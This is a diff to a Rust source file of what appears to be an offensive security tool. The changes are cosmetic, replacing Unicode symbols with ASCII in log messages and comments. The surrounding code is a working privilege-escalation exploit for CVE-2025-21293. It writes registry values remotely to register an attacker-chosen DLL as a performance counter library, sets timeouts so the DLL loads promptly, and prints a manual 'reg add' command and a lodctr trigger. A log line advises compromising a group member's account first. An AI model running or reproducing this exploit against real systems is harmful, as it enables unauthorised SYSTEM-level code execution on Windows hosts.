@@ -1,4 +1,4 @@
-//! CVE-2025-21293 — Network Configuration Operators privilege escalation.
+//! CVE-2025-21293 -- Network Configuration Operators privilege escalation.
 //!
 //! Members of the built-in `Network Configuration Operators` group can create
 //! malicious registry subkeys under DnsCache/NetBT service entries and register
@@ -114,7 +114,7 @@ pub async fn exploit_netcfg_ops(
             .await
             {
                 Ok(()) => {
-                    log.push("  ✓ Remote registry write succeeded".to_string());
+                    log.push("  [+] Remote registry write succeeded".to_string());
                     registry_write_success = true;
 
                     // Also set Open Timeout and Collect Timeout to ensure the
@@ -139,21 +139,21 @@ pub async fn exploit_netcfg_ops(
                     )
                     .await;
 
-                    log.push("  ✓ Timeout values configured for prompt DLL load".to_string());
+                    log.push("  [+] Timeout values configured for prompt DLL load".to_string());
                     log.push("  Trigger: Wait for Performance Counter collection or force via lodctr /e:".to_string());
                     exploit_success = true;
                     registered_path = Some(dll.to_string());
                 }
                 Err(e) => {
-                    log.push(format!("  ✗ Remote registry write failed: {e}"));
+                    log.push(format!("  [-] Remote registry write failed: {e}"));
                     // Registry write failed but we still had NetCfgOps membership
-                    // — the exploit isn't fully successful but the info is valuable
+                    // -- the exploit isn't fully successful but the info is valuable
                     exploit_success = false;
                     registered_path = Some(dll.to_string());
                 }
             }
         } else {
-            log.push("  No SMB session provided — registry write not attempted".to_string());
+            log.push("  No SMB session provided -- registry write not attempted".to_string());
             log.push(format!(
                 "  Manual command: reg add \"HKLM\\{PERF_LIBRARY_PATH}\" /v {PERF_LIBRARY_VALUE} /t REG_SZ /d \"{dll}\" /f"
             ));
@@ -165,7 +165,7 @@ pub async fn exploit_netcfg_ops(
             registered_path = Some(dll.to_string());
         }
     } else {
-        log.push("  Not a member of NetCfgOps — cannot exploit directly".to_string());
+        log.push("  Not a member of NetCfgOps -- cannot exploit directly".to_string());
         log.push("  Suggestion: Find a member and compromise their account first".to_string());
     }
 
